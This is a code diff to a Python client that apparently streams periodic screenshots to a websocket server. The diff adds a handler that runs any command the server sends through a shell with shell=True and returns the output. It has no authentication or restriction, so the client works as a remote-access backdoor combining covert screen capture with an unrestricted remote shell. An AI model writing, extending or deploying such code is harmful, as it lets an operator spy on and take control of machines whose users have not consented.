@@ -1,4 +1,5 @@
 import os
+import subprocess
 import pyscreenshot as ImageGrab
 import websockets
 import asyncio
@@ -36,9 +37,11 @@ async def send_screenshot(websocket):
 
         data = json.dumps(
             {
-                "image": image_data,
-                "created": created,
-                "filename": filename,
+                "screenshot": {
+                    "image": image_data,
+                    "created": created,
+                    "filename": filename,
+                }
             }
         )
 
@@ -46,10 +49,24 @@ async def send_screenshot(websocket):
         await asyncio.sleep(config.SHOT_TIME)
 
 
+async def run_command(command):
+    return subprocess.run(
+        command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, shell=True
+    ).stdout
+
+
 async def receive_message(websocket):
     while True:
         async for message in websocket:
-            print("Received message:", message)
+            message = json.loads(message)
+            if message.get("command"):
+                command = message.get("command")
+                data = json.dumps(
+                    {
+                        "result_command": await run_command(command),
+                    }
+                )
+                await websocket.send(data)
 
 
 async def main(websocket):
